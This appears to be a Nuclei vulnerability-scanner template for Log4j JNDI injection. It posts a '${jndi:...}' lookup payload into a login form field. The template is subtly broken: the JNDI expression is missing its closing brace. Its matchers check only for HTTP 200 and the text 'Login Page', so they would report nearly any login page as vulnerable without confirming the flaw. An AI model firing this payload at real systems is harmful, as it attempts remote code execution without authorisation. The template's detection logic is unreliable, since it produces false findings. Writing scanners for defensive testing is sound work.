id: log4j-login-jndi
info:
  name: Log4j JNDI injection on login form
  severity: critical
  tags: log4j,rce,cve
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        a=${jndi:{{payload}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Login Page"
